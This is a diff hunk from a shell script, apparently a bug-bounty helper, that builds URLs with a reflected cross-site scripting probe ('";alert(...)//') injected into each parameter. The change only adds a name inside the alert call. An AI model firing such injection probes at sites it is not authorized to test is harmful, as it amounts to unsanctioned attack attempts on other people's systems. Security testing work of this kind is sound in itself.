@@ -28,9 +28,9 @@ do
 	varName=$(echo "$line" | awk '{print $2}' | cut -d= -f1)
 	if [ $(echo $url | awk -F"/" '{print NF}') -lt 4 ]
 	then
-		echo "$url/?$varName=\";alert()//"
+		echo "$url/?$varName=\";alert(Raywando)//"
 	else
-		echo "$url?$varName=\";alert()//"
+		echo "$url?$varName=\";alert(Raywando)//"
 	fi
 done < tmp
 cd .. && rm tmp && rm out -r
